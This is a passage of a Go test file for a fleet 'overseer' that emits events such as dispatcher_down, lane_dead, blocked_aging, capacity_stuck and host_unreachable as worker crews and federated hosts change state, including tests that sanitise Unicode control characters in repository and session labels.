			withLane(ovCrew("c2", "live", "attended", blockedWorker("worker:feat/b#s1-1", ovStart, 600, "worker", false)), "dead"),
			ovCrew("c3", "live", "attended", func() map[string]any {
				w := ovWorker("worker:feat/c#s1-1", "failed")
				w["detail"] = "blocked, no dispatcher reply"
				return w
			}()),
		)),
		fleetpkg.QueueStatus{
			Head:    &fleetpkg.QueueHead{Repo: "o/alpha", CrewID: "c1", ID: "h1", WaitedS: 5000},
			Demoted: []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h2"}},
			Parked:  []fleetpkg.QueueParked{{Repo: "o/alpha", CrewID: "c1", ID: "h3", Reason: "oversize"}},
		}, 4, 9)
	later := alarming
	later.TS += minute
	wantSteps(t, steps(t, alarming, later), none(), none())
}

func TestTransitionsDispatcherDown(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	tr := newTransitions()
	step(t, tr, ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w))))
	got := step(t, tr, ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w))))
	want := []map[string]any{{"stream": "overseer", "event": "dispatcher_down", "repo": "o/alpha", "crew": "c1", "host": ovHost,
		"state": "dead", "ts": float64(ovStart + minute + 1)}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("live → dead = %v, want %v", got, want)
	}
	if got := step(t, tr, ovDoc(ovStart+2*minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w)))); len(got) != 0 {
		t.Errorf("still dead = %v, want nothing", got)
	}
}

func TestTransitionsNoDownForIdleCrew(t *testing.T) {
	wantSteps(t, steps(t,
		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended"))),
		ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "idle"))),
		ovDoc(ovStart+2*minute, ovRepo("alpha", ovCrew("c1", "closed", "idle"))),
	), none(), none(), none())
}

// An idle crew that gains work again with no dispatcher is down again.
func TestTransitionsIdleTurningUnattendedIsDown(t *testing.T) {
	wantSteps(t, steps(t,
		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "closed", "idle"))),
		ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "closed", "unattended", ovWorker("worker:feat/a#s1-1", "working")))),
	), none(), evs("dispatcher_down"))
}

func TestTransitionsDispatcherUpOnlyAfterDown(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	repo := func(c1, c2 string) fleetpkg.RepoStatus {
		att := func(s string) string {
			if s == "live" {
				return "attended"
			}
			return "unattended"
		}
		return ovRepo("alpha", ovCrew("c1", c1, att(c1), w), ovCrew("c2", c2, att(c2), w))
	}
	tr := newTransitions()
	var got [][]map[string]any
	for i, d := range [][2]string{
		{"live", "dead"}, // baseline: c2 is already down, so it never gets an up
		{"dead", "live"},
		{"live", "live"},
		{"live", "live"},
		{"dead", "live"},
		{"live", "live"},
	} {
		got = append(got, step(t, tr, ovDoc(ovStart+int64(i)*minute, repo(d[0], d[1]))))
	}
	var names [][]string
	for _, lines := range got {
		var n []string
		for _, l := range lines {
			n = append(n, l["event"].(string)+" "+l["crew"].(string))
		}
		names = append(names, n)
	}
	wantSteps(t, names, none(), evs("dispatcher_down c1"), evs("dispatcher_up c1"), none(), evs("dispatcher_down c1"), evs("dispatcher_up c1"))
	if up := got[2][0]; up["repo"] != "o/alpha" || up["host"] != ovHost || len(up) != 6 {
		t.Errorf("dispatcher_up line = %v, want stream, event, repo, crew, host and ts", up)
	}
}

func TestTransitionsLaneDeadAfterTenMinutes(t *testing.T) {
	blocked := blockedWorker("worker:feat/a#s1-1", ovStart, nil, "worker", true)
	at := func(m int64, lane string, w map[string]any) fleetpkg.StatusDoc {
		return ovDoc(ovStart+m*minute, ovRepo("alpha", withLane(ovCrew("c1", "live", "attended", w), lane)))
	}
	tr := newTransitions()
	var names [][]string
	var fired map[string]any
	for _, d := range []fleetpkg.StatusDoc{
		at(0, "dead", blocked), at(9, "dead", blocked), at(10, "dead", blocked), at(11, "dead", blocked),
		at(12, "alive", blocked), at(13, "dead", blocked), at(22, "dead", blocked), at(23, "dead", blocked),
	} {
		var n []string
		for _, l := range step(t, tr, d) {
			n = append(n, l["event"].(string))
			fired = l
		}
		names = append(names, n)
	}
	wantSteps(t, names, none(), none(), evs("lane_dead"), none(), none(), none(), none(), evs("lane_dead"))
	if fired["dead_s"] != float64(600) || fired["crew"] != "c1" || fired["repo"] != "o/alpha" {
		t.Errorf("lane_dead line = %v, want dead_s 600", fired)
	}

	stale := blockedWorker("worker:feat/a#s1-1", ovStart, nil, "worker", true)
	stale["stale"] = true
	working := ovWorker("worker:feat/a#s1-1", "working")
	for _, w := range []map[string]any{stale, working} {
		wantSteps(t, steps(t, at(0, "dead", w), at(10, "dead", w), at(20, "dead", w)), none(), none(), none())
	}
}

func TestTransitionsBlockedAgingByAgeThenBudget(t *testing.T) {
	for _, crew := range []struct{ state, attention string }{{"live", "attended"}, {"dead", "unattended"}} {
		at := func(m int64, budget any) fleetpkg.StatusDoc {
			return ovDoc(ovStart+m*minute, ovRepo("alpha",
				ovCrew("c1", crew.state, crew.attention, blockedWorker("worker:feat/a#s1-1", ovStart, budget, "worker", false))))
		}
		tr := newTransitions()
		var lines [][]map[string]any
		for _, d := range []fleetpkg.StatusDoc{at(0, nil), at(29, nil), at(30, nil), at(31, 1800), at(32, 1500), at(33, 1200)} {
			lines = append(lines, step(t, tr, d))
		}
		for i, wantN := range []int{0, 0, 1, 0, 1, 0} {
			if len(lines[i]) != wantN {
				t.Errorf("%s: document %d = %v, want %d lines", crew.attention, i, lines[i], wantN)
			}
		}
		if t.Failed() {
			continue
		}
		age := map[string]any{"stream": "overseer", "event": "blocked_aging", "repo": "o/alpha", "crew": "c1", "host": ovHost,
			"session": "worker:feat/a#s1-1", "branch": "feat/a", "trigger": "age", "since": float64(ovStart),
			"budget_left_s": nil, "ts": float64(ovStart + 30*minute + 1)}
		if !reflect.DeepEqual(lines[2][0], age) {
			t.Errorf("%s: age line = %v, want %v", crew.attention, lines[2][0], age)
		}
		if l := lines[4][0]; l["trigger"] != "budget" || l["budget_left_s"] != float64(1500) {
			t.Errorf("%s: budget line = %v", crew.attention, l)
		}
	}
}

func TestTransitionsWatchdogBlockOnlyInUnattendedCrew(t *testing.T) {
	at := func(m int64, state, attention, source string, answered bool) fleetpkg.StatusDoc {
		return ovDoc(ovStart+m*minute, ovRepo("alpha",
			ovCrew("c1", state, attention, blockedWorker("worker:feat/a#s1-1", ovStart, 600, source, answered))))
	}
	wantSteps(t, steps(t, at(0, "live", "attended", "watchdog", false), at(40, "live", "attended", "watchdog", false)),
		none(), none())
	wantSteps(t, steps(t, at(0, "dead", "unattended", "watchdog", false), at(40, "dead", "unattended", "watchdog", false)),
		none(), evs("blocked_aging"))
	// Once the dispatcher has answered, the wait is its own again.
	wantSteps(t, steps(t, at(0, "live", "attended", "worker", true), at(40, "live", "attended", "worker", true)),
		none(), none())
}

func TestTransitionsAbandoned(t *testing.T) {
	failed := func(detail string) map[string]any {
		w := ovWorker("worker:feat/a#s1-1", "failed")
		w["detail"] = detail
		return w
	}
	at := func(m int64, w map[string]any) fleetpkg.StatusDoc {
		return ovDoc(ovStart+m*minute, ovRepo("alpha", ovCrew("c1", "live", "attended", w)))
	}
	tr := newTransitions()
	step(t, tr, at(0, ovWorker("worker:feat/a#s1-1", "working")))
	got := step(t, tr, at(1, failed("blocked, no dispatcher reply")))
	want := []map[string]any{{"stream": "overseer", "event": "abandoned", "repo": "o/alpha", "crew": "c1", "host": ovHost,
		"session": "worker:feat/a#s1-1", "branch": "feat/a", "ts": float64(ovStart + minute + 1)}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("abandoned = %v, want %v", got, want)
	}
	if got := step(t, tr, at(2, failed("blocked, no dispatcher reply"))); len(got) != 0 {
		t.Errorf("still failed = %v, want nothing", got)
	}
	if got := step(t, tr, at(3, ovWorker("worker:feat/a#s1-1", "working"))); len(got) != 0 {
		t.Errorf("working again = %v, want nothing", got)
	}
	if got := step(t, tr, at(4, failed("blocked, no dispatcher reply"))); len(got) != 1 || got[0]["event"] != "abandoned" {
		t.Errorf("failed again = %v, want abandoned again", got)
	}
	wantSteps(t, steps(t, at(0, ovWorker("worker:feat/a#s1-1", "working")), at(1, failed("tests red"))), none(), none())
}

// A stamped lead pane can post any worker:<branch>#s<sid>: the session and
// branch reach a line in the sender charset only.
func TestTransitionsFilterWorkerText(t *testing.T) {
	from := "worker:feat/a\u202e#s1\u200b-1\u0085"
	failed := ovWorker(from+"x", "failed")
	failed["detail"] = "blocked, no dispatcher reply"
	at := func(m int64, ws ...map[string]any) fleetpkg.StatusDoc {
		return ovDoc(ovStart+m*minute, ovRepo("alpha", ovCrew("c1", "live", "attended", ws...)))
	}
	blocked := blockedWorker(from, ovStart, nil, "worker", false)
	tr := newTransitions()
	step(t, tr, at(0, blocked, ovWorker(from+"x", "working")))
	got := step(t, tr, at(30, blocked, failed))
	want := map[string]map[string]any{
		"abandoned":     {"session": "worker:feat/a?#s1?-1?x", "branch": "feat/a?"},
		"blocked_aging": {"session": "worker:feat/a?#s1?-1?", "branch": "feat/a?"},
	}
	if len(got) != 2 {
		t.Fatalf("lines = %v, want abandoned and blocked_aging", got)
	}
	for _, l := range got {
		w := want[l["event"].(string)]
		if l["session"] != w["session"] || l["branch"] != w["branch"] {
			t.Errorf("%s line = %v, want session %q branch %q", l["event"], l, w["session"], w["branch"])
		}
	}
}

func TestTransitionsFilterRepoAndQueueText(t *testing.T) {
	const dirty = "o/al\u202epha\u200b\u0085"
	const clean = "o/al?pha??"
	w := ovWorker("worker:feat/a#s1-1", "working")
	repo := ovRepo("alpha", ovCrew("c1", "live", "attended", w))
	repo.Repo = dirty
	tr := newTransitions()
	step(t, tr, ovDoc(ovStart, repo))
	repo.Crews = []fleetpkg.CrewStatus{ovCrew("c1", "dead", "unattended", w)}
	got := step(t, tr, ovDoc(ovStart+minute, repo))
	if len(got) != 1 || got[0]["repo"] != clean {
		t.Errorf("repo label = %v, want %q", got, clean)
	}

	q := fleetpkg.QueueStatus{Head: &fleetpkg.QueueHead{Repo: dirty, CrewID: "c\u202e1", ID: "h\u200b1", WaitedS: headWaitS}}
	tr = newTransitions()
	step(t, tr, withQueue(ovDoc(ovStart), fleetpkg.QueueStatus{}, 10, 5))
	got = step(t, tr, withQueue(ovDoc(ovStart+minute), q, 10, 5))
	if len(got) != 1 || got[0]["repo"] != clean || got[0]["crew"] != "c?1" || got[0]["hold"] != "h?1" {
		t.Errorf("capacity_stuck = %v, want repo %q crew c?1 hold h?1", got, clean)
	}
}

func TestTransitionsKeyFarRepos(t *testing.T) {
	far := func(name string, c fleetpkg.CrewStatus) fleetpkg.RepoStatus {
		return fleetpkg.RepoStatus{Repo: "o/" + name, Key: "/far/" + name + "/.git", Crews: []fleetpkg.CrewStatus{c}}
	}
	live := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "live", "attended")) }
	down := func(name string) fleetpkg.RepoStatus { return far(name, ovCrew("c1", "dead", "unattended")) }
	tr := newTransitions()
	step(t, tr, ovDoc(ovStart, live("a"), live("b")))
	if got := step(t, tr, ovDoc(ovStart+minute, down("a"), down("b"))); len(got) != 2 {
		t.Errorf("dispatcher_down lines = %v, want one per far repo", got)
	}
	if got := step(t, tr, ovDoc(ovStart+2*minute, down("a"))); len(got) != 0 {
		t.Errorf("an absent far repo re-fired: %v", got)
	}
	if got := step(t, tr, ovDoc(ovStart+3*minute, down("a"), down("b"))); len(got) != 0 {
		t.Errorf("a carried-forward far key re-fired: %v", got)
	}
}

func TestFleetRepoNameFiltersOrigin(t *testing.T) {
	common := "/git/alpha/.git"
	o := FleetOptions{Git: origin(common, "https://github.com/acme/al\u202epha\u200b.git")}
	if got, want := o.repoName(common), "acme/al?pha?"; got != want {
		t.Errorf("repoName = %q, want %q", got, want)
	}
}

func TestTransitionsBlockedAgingRearms(t *testing.T) {
	at := func(m, since int64, answered bool) fleetpkg.StatusDoc {
		return ovDoc(ovStart+m*minute, ovRepo("alpha", ovCrew("c1", "live", "attended",
			blockedWorker("worker:feat/a#s1-1", ovStart+since*minute, nil, "worker", answered))))
	}
	wantSteps(t, steps(t, at(0, 0, false), at(30, 0, false), at(31, 0, true), at(32, 32, false), at(61, 32, false), at(62, 32, false)),
		none(), evs("blocked_aging"), none(), none(), none(), evs("blocked_aging"))
}

func TestTransitionsCapacityStuck(t *testing.T) {
	head := func(waited int64) *fleetpkg.QueueHead {
		return &fleetpkg.QueueHead{Repo: "o/alpha", CrewID: "c1", ID: "h1", WaitedS: waited}
	}
	demoted := func(ids ...string) []fleetpkg.QueueDemote {
		out := []fleetpkg.QueueDemote{}
		for _, id := range ids {
			out = append(out, fleetpkg.QueueDemote{Repo: "o/beta", CrewID: "c2", ID: id})
		}
		return out
	}
	parked := []fleetpkg.QueueParked{
		{Repo: "o/beta", CrewID: "c2", ID: "h4", Reason: "demoted"},
		{Repo: "o/beta", CrewID: "c2", ID: "h5", Reason: "oversize"},
		{Repo: "o/beta", CrewID: "c2", ID: "h6", Reason: "ineligible"},
	}
	at := func(m int64, q fleetpkg.QueueStatus, weight int) fleetpkg.StatusDoc {
		return withQueue(ovDoc(ovStart+m*minute), q, 10, weight)
	}
	tr := newTransitions()
	var got [][]map[string]any
	for _, d := range []fleetpkg.StatusDoc{
		at(0, fleetpkg.QueueStatus{Head: head(100)}, 5),
		at(1, fleetpkg.QueueStatus{Head: head(1800)}, 5),
		at(2, fleetpkg.QueueStatus{Head: head(1900), Demoted: demoted("h2")}, 5),
		at(3, fleetpkg.QueueStatus{Head: head(2000), Demoted: demoted("h2", "h3")}, 5),
		at(4, fleetpkg.QueueStatus{Head: head(2100), Demoted: demoted("h2", "h3"), Parked: parked}, 5),
		at(5, fleetpkg.QueueStatus{Head: head(2200), Demoted: demoted("h2", "h3"), Parked: parked}, 12),
		at(6, fleetpkg.QueueStatus{Head: head(2300), Demoted: demoted("h2", "h3"), Parked: parked}, 12),
		at(7, fleetpkg.QueueStatus{Head: head(100)}, 5),
		at(8, fleetpkg.QueueStatus{Head: head(1800)}, 5),
	} {
		got = append(got, step(t, tr, d))
	}
	var names [][]string
	for _, lines := range got {
		var n []string
		for _, l := range lines {
			n = append(n, l["cause"].(string)+" "+l["hold"].(string))
		}
		names = append(names, n)
	}
	wantSteps(t, names,
		none(),
		evs("head_wait h1"),
		evs("demoted h2"),
		evs("demoted h3"),
		evs("parked h4", "oversize h5"),
		evs("overshoot "),
		none(),
		none(),
		evs("head_wait h1"),
	)
	if t.Failed() {
		return
	}
	headWait := map[string]any{"stream": "overseer", "event": "capacity_stuck", "repo": "o/alpha", "crew": "c1",
		"host": ovHost, "cause": "head_wait", "hold": "h1", "waited_s": float64(1800), "ts": float64(ovStart + minute + 1)}
	if !reflect.DeepEqual(got[1][0], headWait) {
		t.Errorf("head_wait line = %v, want %v", got[1][0], headWait)
	}
	overshoot := map[string]any{"stream": "overseer", "event": "capacity_stuck", "repo": "", "crew": "",
		"host": ovHost, "cause": "overshoot", "hold": "", "ts": float64(ovStart + 5*minute + 1)}
	if !reflect.DeepEqual(got[5][0], overshoot) {
		t.Errorf("overshoot line = %v, want %v", got[5][0], overshoot)
	}
}

// causes runs each document in turn and returns its capacity_stuck lines as
// "<cause> <hold>".
func causes(t *testing.T, docs ...fleetpkg.StatusDoc) [][]string {
	t.Helper()
	tr := newTransitions()
	var out [][]string
	for _, d := range docs {
		var names []string
		for _, l := range step(t, tr, d) {
			names = append(names, l["cause"].(string)+" "+l["hold"].(string))
		}
		out = append(out, names)
	}
	return out
}

// One hold moving to another cause is a new condition.
func TestTransitionsCapacityCauseIsInTheKey(t *testing.T) {
	at := func(m int64, q fleetpkg.QueueStatus) fleetpkg.StatusDoc {
		return withQueue(ovDoc(ovStart+m*minute), q, 10, 5)
	}
	h1 := []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h1"}}
	wantSteps(t, causes(t,
		at(0, fleetpkg.QueueStatus{}),
		at(1, fleetpkg.QueueStatus{Demoted: h1}),
		at(2, fleetpkg.QueueStatus{Parked: []fleetpkg.QueueParked{{Repo: "o/alpha", CrewID: "c1", ID: "h1", Reason: "demoted"}}}),
	), none(), evs("demoted h1"), evs("parked h1"))

	head := func(waited int64) *fleetpkg.QueueHead {
		return &fleetpkg.QueueHead{Repo: "o/alpha", CrewID: "c1", ID: "h2", WaitedS: waited}
	}
	wantSteps(t, causes(t,
		at(0, fleetpkg.QueueStatus{Head: head(100)}),
		at(1, fleetpkg.QueueStatus{Head: head(1800)}),
		at(2, fleetpkg.QueueStatus{Head: head(1900), Demoted: []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h2"}}}),
	), none(), evs("head_wait h2"), evs("demoted h2"))
}

func TestTransitionsOvershootRearms(t *testing.T) {
	q := fleetpkg.QueueStatus{Demoted: []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h1"}}}
	at := func(m int64, weight int) fleetpkg.StatusDoc {
		return withQueue(ovDoc(ovStart+m*minute), q, 10, weight)
	}
	wantSteps(t, causes(t, at(0, 5), at(1, 12), at(2, 12), at(3, 5), at(4, 12)),
		none(), evs("overshoot "), none(), none(), evs("overshoot "))
}

func TestTransitionsCapacityNeverWithoutBudgetOrQueue(t *testing.T) {
	q := fleetpkg.QueueStatus{Head: &fleetpkg.QueueHead{Repo: "o/alpha", CrewID: "c1", ID: "h1", WaitedS: 10}}
	wantSteps(t, steps(t,
		withQueue(ovDoc(ovStart), q, 0, 0),
		withQueue(ovDoc(ovStart+minute), q, 0, 8),
	), none(), none())
	wantSteps(t, steps(t,
		withQueue(ovDoc(ovStart), fleetpkg.QueueStatus{}, 4, 2),
		withQueue(ovDoc(ovStart+minute), fleetpkg.QueueStatus{}, 4, 9),
	), none(), none())
}

func TestTransitionsSkippedRepoKeepsItsKeys(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	blocked := blockedWorker("worker:feat/b#s1-1", ovStart, nil, "worker", true)
	at := func(m int64, c1 string) fleetpkg.StatusDoc {
		attention := "attended"
		if c1 != "live" {
			attention = "unattended"
		}
		return ovDoc(ovStart+m*minute, ovRepo("alpha",
			ovCrew("c1", c1, attention, w),
			withLane(ovCrew("c2", "live", "attended", blocked), "dead")))
	}
	skipped := func(m int64) fleetpkg.StatusDoc { return ovDoc(ovStart + m*minute) }
	tr := newTransitions()
	var names [][]string
	for _, d := range []fleetpkg.StatusDoc{at(0, "live"), at(1, "dead"), skipped(5), at(10, "dead")} {
		var n []string
		for _, l := range step(t, tr, d) {
			n = append(n, l["event"].(string)+" "+l["crew"].(string))
		}
		names = append(names, n)
	}
	// c1 stays down across the skip, so it is not down again; c2's lane has been
	// dead since the baseline, the skipped round included.
	wantSteps(t, names, none(), evs("dispatcher_down c1"), none(), evs("lane_dead c2"))
}

func TestTransitionsNeverWakeOnRawStatusRows(t *testing.T) {
	var docs []fleetpkg.StatusDoc
	for i, w := range []map[string]any{
		ovWorker("worker:feat/a#s1-1", "working"),
		blockedWorker("worker:feat/a#s1-1", ovStart+minute, 7200, "worker", false),
		ovWorker("worker:feat/a#s1-1", "pr_open"),
		ovWorker("worker:feat/a#s1-1", "done"),
		func() map[string]any {
			w := ovWorker("worker:feat/a#s1-1", "failed")
			w["detail"] = "tests red"
			return w
		}(),
		ovWorker("worker:feat/a#s1-1", "exited"),
	} {
		docs = append(docs, ovDoc(ovStart+int64(i)*minute, ovRepo("alpha", ovCrew("c1", "live", "attended", w))))
	}
	for i, lines := range steps(t, docs...) {
		if len(lines) != 0 {
			t.Errorf("document %d woke %v", i, lines)
		}
	}
}

// Federation: a partner's view arrives as doc.Hosts, folded per host.

func p64(n int64) *int64 { return &n }

func okHost(name string, ts int64, rs ...fleetpkg.RepoStatus) fleetpkg.HostStatus {
	return fleetpkg.HostStatus{Host: name, State: "ok", TS: p64(ts), LastOkTS: p64(ts), Repos: rs}
}

func downHost(name string, lastOK int64, errText string) fleetpkg.HostStatus {
	return fleetpkg.HostStatus{Host: name, State: "unreachable", LastOkTS: p64(lastOK), Error: &errText}
}

func withHosts(d fleetpkg.StatusDoc, hs ...fleetpkg.HostStatus) fleetpkg.StatusDoc {
	d.Hosts = hs
	return d
}

// fedRun diffs each doc in turn through a bare overseer and returns the lines
// printed after each one.
func fedRun(t *testing.T, v *overseer, docs ...fleetpkg.StatusDoc) [][]map[string]any {
	t.Helper()
	var out lockedWriter
	v.out = &laneWriter{w: &out, now: time.Now}
	i := 0
	v.collect = func(context.Context, io.Writer, func(string) (int64, bool)) fleetpkg.StatusDoc { i++; return docs[i-1] }
	v.interval = time.Minute
	var got [][]map[string]any
	seen := 0
	for range docs {
		v.diff(t.Context())
		all := decodeLinesT(t, out.str())
		got = append(got, all[seen:])
		seen = len(all)
	}
	return got
}

func fedOverseer(t *testing.T) *overseer {
	t.Helper()
	v := bareOverseer(io.Discard, nil)
	v.host, v.stateDir, v.start, v.timeout = ovHost, t.TempDir(), ovStart, time.Minute
	return v
}

func stubBatches(t *testing.T, batches map[string][]fleetpkg.FarBatch, mis map[string][]fleetpkg.FarMisrouted) {
	t.Helper()
	old := hostBatches
	t.Cleanup(func() { hostBatches = old })
	hostBatches = func(h fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
		return batches[h.Host], mis[h.Host]
	}
}

// farInbox is the lane's inbox for mbp.
func farInbox(t *testing.T, stateDir string) lanepkg.FarInbox {
	t.Helper()
	in, ok := lanepkg.ReadFarInbox(lanepkg.OverseerHostInbox(stateDir, "mbp"))
	if !ok {
		t.Fatal("no inbox for mbp")
	}
	return in
}

func TestOverseerLinesCarryHost(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	got := fedRun(t, fedOverseer(t),
		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended", w))),
		withQueue(ovDoc(ovStart+minute, ovRepo("alpha", ovCrew("c1", "dead", "unattended", w))),
			fleetpkg.QueueStatus{Demoted: []fleetpkg.QueueDemote{{Repo: "o/alpha", CrewID: "c1", ID: "h1"}}}, 0, 0))
	if len(got[1]) != 2 {
		t.Fatalf("lines = %v, want dispatcher_down and capacity_stuck", got[1])
	}
	for _, l := range got[1] {
		if l["host"] != ovHost {
			t.Errorf("line %v: host = %v, want %q", l, l["host"], ovHost)
		}
	}
}

func TestOverseerPartnerDispatcherDownCarriesHost(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	up := okHost("mbp", ovStart, ovRepo("beta", ovCrew("c9", "live", "attended", w)))
	down := okHost("mbp", ovStart+minute, ovRepo("beta", ovCrew("c9", "dead", "unattended", w)))
	got := fedRun(t, fedOverseer(t),
		withHosts(ovDoc(ovStart), up), withHosts(ovDoc(ovStart+minute), down), withHosts(ovDoc(ovStart+2*minute), down))
	if len(got[0]) != 0 || len(got[2]) != 0 {
		t.Errorf("baseline %v / repeat %v printed lines, want none", got[0], got[2])
	}
	if len(got[1]) != 1 || got[1][0]["event"] != "dispatcher_down" || got[1][0]["host"] != "mbp" || got[1][0]["crew"] != "c9" {
		t.Errorf("lines = %v, want one dispatcher_down host mbp", got[1])
	}
}

func TestOverseerGuestCrewFiresOnlyWorkerConditions(t *testing.T) {
	blocked := blockedWorker("worker:feat/g#s1-1", ovStart, nil, "agent", false)
	guest := func(ts int64, state, lane string) fleetpkg.HostStatus {
		return okHost("mbp", ts, ovRepo("beta", withLane(ovCrew("g1", state, "guest", blocked), lane)))
	}
	got := fedRun(t, fedOverseer(t),
		withHosts(ovDoc(ovStart), guest(ovStart, "live", "alive")),
		withHosts(ovDoc(ovStart+minute), guest(ovStart+minute, "dead", "dead")),
		withHosts(ovDoc(ovStart+40*minute), guest(ovStart+40*minute, "live", "dead")))
	for _, step := range got {
		for _, l := range step {
			if l["event"] == "dispatcher_down" || l["event"] == "lane_dead" {
				t.Errorf("guest crew fired %v", l)
			}
		}
	}
	aging := ofEvent(slices.Concat(got...), "blocked_aging")
	if len(aging) != 1 || aging[0]["host"] != "mbp" {
		t.Errorf("blocked_aging lines = %v, want one with host mbp", aging)
	}
}

func TestOverseerHomeCrewRemoteRowFiresNoWorkerEvent(t *testing.T) {
	remote := blockedWorker("worker:feat/r#s1-1", ovStart, nil, "agent", false)
	remote["host"] = "mbp"
	failed := ovWorker("worker:feat/f#s1-1", "failed")
	failed["detail"] = "blocked, no dispatcher reply"
	failed["host"] = "mbp"
	got := fedRun(t, fedOverseer(t),
		ovDoc(ovStart, ovRepo("alpha", ovCrew("c1", "live", "attended"))),
		ovDoc(ovStart+40*minute, ovRepo("alpha", ovCrew("c1", "live", "attended", remote, failed))))
	if len(got[1]) != 0 {
		t.Errorf("remote rows fired %v, want none", got[1])
	}
}

func TestOverseerHostUnreachableThenReachable(t *testing.T) {
	w := ovWorker("worker:feat/a#s1-1", "working")
	good := func(ts int64) fleetpkg.HostStatus {
		return okHost("mbp", ts, ovRepo("beta", ovCrew("c9", "dead", "unattended", w)))
	}
	got := fedRun(t, fedOverseer(t),
		withHosts(ovDoc(ovStart), good(ovStart)),
		withHosts(ovDoc(ovStart+minute), downHost("mbp", ovStart, "ssh: timeout")),
		withHosts(ovDoc(ovStart+2*minute), downHost("mbp", ovStart, "ssh: timeout")),
		withHosts(ovDoc(ovStart+3*minute), good(ovStart+3*minute)))
	if len(got[0]) != 0 || len(got[2]) != 0 {
		t.Errorf("baseline %v / repeat-down %v printed lines", got[0], got[2])
	}
	want := map[string]any{"stream": "overseer", "event": "host_unreachable", "repo": "", "crew": "", "host": "mbp",
		"error": "ssh: timeout", "last_ok_ts": float64(ovStart), "ts": float64(ovStart)}
	if len(got[1]) != 1 || !reflect.DeepEqual(got[1][0], want) {
		t.Errorf("down lines = %v, want [%v]", got[1], want)
	}
	if len(got[3]) != 1 || got[3][0]["event"] != "host_reachable" || got[3][0]["host"] != "mbp" {
		t.Errorf("recovery lines = %v, want only host_reachable (dispatcher_down was carried)", got[3])
	}
}

func TestOverseerHostFirstSeenUnreachableIsBaseline(t *testing.T) {
	got := fedRun(t, fedOverseer(t),
		withHosts(ovDoc(ovStart), downHost("mbp", ovStart-minute, "x")),
		withHosts(ovDoc(ovStart+minute), downHost("mbp", ovStart-minute, "x")))
	if len(got[0])+len(got[1]) != 0 {
		t.Errorf("lines = %v, want none", got)
	}
}

func TestOverseerRemoteBatchPrintedOnceAndKeptInTheInbox(t *testing.T) {
	v := fedOverseer(t)
	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg", "body": "hi"} }
	stubBatches(t,
		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{ev(ovStart - 5), ev(ovStart + 10), ev(ovStart + 20)}}}},
		nil)
	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
	if len(got[0]) != 1 || len(got[1]) != 0 {
		t.Fatalf("lines = %v, want the batch once", got)
	}
	b := got[0][0]
	events, _ := b["events"].([]any)
	if b["host"] != "mbp" || b["repo"] != "o/beta" || b["cursor"] != float64(ovStart+20) || len(events) != 2 {
		t.Errorf("batch = %v, want host mbp repo o/beta cursor %d and the two events above the start", b, ovStart+20)
	}
	if in := farInbox(t, v.stateDir); in.Floor != ovStart || len(in.Seen) != 2 {
		t.Errorf("inbox = %+v, want floor %d and the two printed keys", in, ovStart)
	}
}

func TestOverseerRemoteInboxStartsAtTheLaneStart(t *testing.T) {
	v := fedOverseer(t)
	stubBatches(t, nil, nil)
	fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
	if in := farInbox(t, v.stateDir); in.Floor != ovStart || in.Seen == nil || len(in.Seen) != 0 {
		t.Errorf("inbox = %+v, want floor at the lane start %d and no keys", in, ovStart)
	}
}

func TestOverseerRemoteBatchRedeliveredWhenFlushFails(t *testing.T) {
	v := fedOverseer(t)
	v.o.Flush = func() error { return errors.New("pipe") }
	stubBatches(t,
		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10)}}}}},
		nil)
	fedRun(t, v, withHosts(ovDoc(ovStart+10*minute), okHost("mbp", ovStart+10*minute)))
	if in := farInbox(t, v.stateDir); in.Floor != ovStart || len(in.Seen) != 0 {
		t.Errorf("inbox = %+v, want floor %d and no keys: the batch never reached the wire", in, ovStart)
	}
}

func TestOverseerRemoteMisroutedCarriesHostAndSenderOnly(t *testing.T) {
	v := fedOverseer(t)
	stubBatches(t, nil,
		map[string][]fleetpkg.FarMisrouted{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/x#s1", TS: ovStart + 5}, {Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/y#s1", TS: ovStart + 6}}})
	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
	m := ofEvent(slices.Concat(got...), "misrouted_msg")
	if len(m) != 1 || m[0]["host"] != "mbp" || m[0]["from"] != "worker:feat/x#s1" || m[0]["repo"] != "" || m[0]["crew"] != "" || m[0]["misrouted"] != float64(2) {
		t.Errorf("misrouted lines = %v, want one for host mbp from the first sender", m)
	}
	if in := farInbox(t, v.stateDir); len(in.Seen) != 2 {
